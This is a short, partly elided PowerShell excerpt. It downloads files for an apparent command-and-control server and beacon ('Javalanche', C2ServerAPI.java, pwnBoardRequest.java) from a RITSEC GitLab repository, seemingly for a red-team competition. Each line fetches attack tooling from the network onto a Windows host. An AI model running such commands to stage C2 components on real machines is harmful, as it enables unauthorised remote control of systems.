...
Invoke-WebRequest -Uri "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/C2/C2ServerAPI.java?ref_type=heads" -OutFile "C:\Javalanche\Servers\C2\C2ServerAPI.java"
...
Invoke-WebRequest -Uri "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/Beacon/pwnBoardRequest.java?ref_type=heads" -OutFile "C:\Javalanche\Servers\Beacon\pwnBoardRequest.java"
...
Invoke-WebRequest -Uri "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/json.jar?ref_type=heads" -OutFile "C:\Javalanche\Servers\json.jar"
